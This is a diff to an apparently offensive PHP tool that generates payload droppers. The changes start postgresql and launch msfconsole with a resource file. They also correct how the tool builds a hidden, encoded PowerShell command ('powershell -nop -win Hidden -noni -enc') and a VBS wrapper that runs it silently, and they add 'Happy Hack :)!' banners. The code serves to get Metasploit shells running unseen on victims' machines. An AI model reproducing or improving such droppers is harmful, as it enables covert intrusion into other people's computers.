@@ -169,6 +169,7 @@ End Sub'."\n";
 echo "\e[96m".$vba."\e[0m\n";
 
 	if(file_exists("meta.rc")){
+		system("service postgresql start");
 		system("msfconsole -r meta.rc");
 		system("rm meta.rc");
 	}else{
@@ -328,7 +329,7 @@ echo "\e[101m\e[97mHappy Hack :)!\e[0m\n";
 elseif($lencode =="cmd"){
 
  $powershell_encoded = generate_shell();
-    echo "powershell -nop -win Hidden -noni -enc " + $powershell_encoded;
+    echo "powershell -nop -win Hidden -noni -enc ".$powershell_encoded;
 	echo "\n\e[101m\e[97mHappy Hack :)!\e[0m\n";
 }
 ###########################RAW ENCODE#############################
@@ -344,9 +345,10 @@ elseif($lencode =="vbs"){
 $powershell_encoded = generate_shell();
 
 $vbs= 'Set objShell = CreateObject("Wscript.Shell")
-objShell.Run "powershell -nop -win Hidden -noni -enc '.$powershell_encoded.'", 0';
+objShell.Run "powershell -nop -win Hidden -noni -enc '.$powershell_encoded.'", 0'."\n";
 
 echo $vbs;
+echo "\n\e[101m\e[97mHappy Hack :)!\e[0m\n";
 
 }else{
 	die("Unknown Format!\n");
